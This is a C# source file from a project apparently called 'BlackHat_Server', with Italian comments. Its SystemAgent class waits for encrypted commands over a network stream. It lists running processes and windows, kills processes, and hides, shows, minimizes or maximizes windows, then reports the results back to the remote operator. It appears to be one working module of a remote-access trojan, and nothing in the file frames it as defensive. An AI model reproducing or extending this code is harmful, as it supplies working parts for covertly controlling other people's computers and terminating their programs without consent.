using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace BlackHat_Server
{
    class SystemAgent
    {
        NetworkStream systemStream;
        MsgManager mm;

        bool stopSystemListener = false;

        public SystemAgent(NetworkStream clientStream)
        {
            systemStream = clientStream;
            mm = new MsgManager(clientStream);
        }

        /// <summary>
        /// Avvia thread di ascolto per System Info
        /// </summary>
        public void StartSystemListener()
        {
            Thread t = new Thread(SystemListener);
            t.IsBackground = true;            
            t.Start();
        }


        /// <summary>
        /// Listener System Info
        /// </summary>
        private void SystemListener()
        {
            while (ST_Client.Instance.isConnected && !stopSystemListener)
            {
                try
                {
                    System.Threading.Thread.Sleep(10);

                    string cmd = mm.WaitForEncryMessageRicorsive(10000);

                    if (stopSystemListener)
                        break;

                    if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                    {
                        string[] cmdSplit = cmd.Split('|');

                        switch (cmdSplit[0])
                        {
                            case "LIST_PROCESSES":
                                // INVIA LISTA DEI PROCESSI ATTIVI
                                SendProcesses();
                                break;

                            case "KILL":
                                // KILLO IL PROCESSO INDICATO ON CMDSPLIT1
                                KillProcess(cmdSplit[1]);
                                break;

                            case "EXIT":
                                // ESCO DAL CICLO E VIENE UCCISO IL THREAD E LISTENER
                                stopSystemListener = true;
                                break;

                            case "LIST_WINDOWS":
                                // INVIA LISTA DELLE finestre
                                SendWindows();
                                break;

                            case "MINIMIZE_WINDOW":
                                // RICHIESTA Minimize FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                MinimizeWindow(cmdSplit[1]);
                                break;

                            case "MAXIMIZE_WINDOW":
                                // RICHIESTA Maximize FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                MaximizeWindow(cmdSplit[1]);
                                break;

                            case "HIDE_WINDOW":
                                // RICHIESTA Hide FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                HideWindow(cmdSplit[1]);
                                break;

                            case "SHOW_WINDOW":
                                // RICHIESTA Show FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                ShowWindow(cmdSplit[1]);
                                break;

                            default:
                                break;
                        }



                    }
                }
                catch 
                {                    
                }

            }

            // ARRIVO QUI PERCHè IL LISTENER è MORTO

            if (ST_Client.Instance.nsListaCanali.Contains(systemStream))
                ST_Client.Instance.nsListaCanali.Remove(systemStream);


            try
            {
                systemStream.Close();
            }
            catch
            {

            }
                
        }


        /// <summary>
        ///  Invia i Processi
        ///  La * divide i processi
        ///  La | divide le proprietà dei processi
        /// </summary>
        private void SendProcesses()
        {
            try
            {
                Process[] activeProcess = Process.GetProcesses();

                string processListMessage = "";

                foreach (Process process in activeProcess)
                {
                    // NOME DEL PROCESSO
                    string procName = "";
                    string procDescription = "";
                    string procLocation = "";

                    try
                    {
                        procLocation = process.Modules[0].FileName;

                        if (procLocation != "")
                        {
                            procName = Path.GetFileName(procLocation);
                            procDescription = process.Modules[0].FileVersionInfo.FileDescription;
                        }

                    }
                    catch 
                    {
                        procName = process.ProcessName;
                        procLocation = "";
                        procDescription = "";
                    }
                    //----------------------                    

                    
                    string procID = process.Id.ToString();
                    string procThradsNumb = process.Threads.Count.ToString();

                    string procListEntry = string.Format("{0}|{1}|{2}|{3}|{4}", procName, procID,procThradsNumb,procLocation,procDescription);
                    processListMessage += procListEntry + "*";
                }

                processListMessage = processListMessage.TrimEnd('*');

                mm.SendLargeEncryMessage(processListMessage, 10000);                

            }
            catch 
            {                
               
            }
           
        }
        //--------------------------------


        /// <summary>
        /// Termina il processo indicato dall'ID
        /// </summary>
        /// <param name="procID"></param>
        private void KillProcess(string procID)
        {
            try
            {
                int iID = int.Parse(procID);

                Process p = Process.GetProcessById(iID);

                if (p != null)                
                    p.Kill();

                mm.SendEncryMessage("KILLED!",5000);
                
            }
            catch 
            {
                mm.SendEncryMessage("NOT_KILLED!", 5000);
            }
           

        }
        //--------------------------------

        /// <summary>
        /// Invia le finestre
        /// </summary>
        private void SendWindows()
        {
            try
            {
                WindowsManager wm = new WindowsManager();
                string winList = wm.GetWindows();

                if (winList != null)
                    mm.SendLargeEncryMessage(winList,10000);
            }
            catch 
            {              
                
            }
        }


        /// <summary>
        /// Minimize una finestra
        /// Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void MinimizeWindow(string sHandle)
        {
            try
            {
                int iHandle = int.Parse(sHandle);
                WindowsManager wm = new WindowsManager();

                int minimize = wm.MinimizeWindow(iHandle);

                if (minimize > 0)
                    mm.SendEncryMessage("MINIZED",5000);
                else
                    mm.SendEncryMessage("NOT_MINIMIZED",5000);

            }
            catch 
            {
                mm.SendEncryMessage("NOT_CLOSED", 5000);
            }
            
        }

        /// <summary>
        /// Massimizza una finestra
        /// Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void MaximizeWindow(string sHandle)
        {
            try
            {
                int iHandle = int.Parse(sHandle);
                WindowsManager wm = new WindowsManager();

                int minimize = wm.MaximizeWindow(iHandle);

                if (minimize > 0)
                    mm.SendEncryMessage("OK", 5000);
                else
                    mm.SendEncryMessage("NOT", 5000);

            }
            catch
            {
                mm.SendEncryMessage("ERROR", 5000);
            }

        }

        /// <summary>
        /// hIDE una finestra
        /// Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void HideWindow(string sHandle)
        {
            try
            {
                int iHandle = int.Parse(sHandle);
                WindowsManager wm = new WindowsManager();

                int h = wm.HideWindow(iHandle);

                if (h > 0)
                    mm.SendEncryMessage("OK", 5000);
                else
                    mm.SendEncryMessage("NOT", 5000);

            }
            catch
            {
                mm.SendEncryMessage("ERROR", 5000);
            }

        }

        /// <summary>
        /// Show una finestra
        /// Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void ShowWindow(string sHandle)
        {
            try
            {
                int iHandle = int.Parse(sHandle);
                WindowsManager wm = new WindowsManager();

                int h = wm.ShowWindow(iHandle);

                if (h > 0)
                    mm.SendEncryMessage("OK", 5000);
                else
                    mm.SendEncryMessage("NOT", 5000);

            }
            catch
            {
                mm.SendEncryMessage("ERROR", 5000);
            }

        }

    }
}
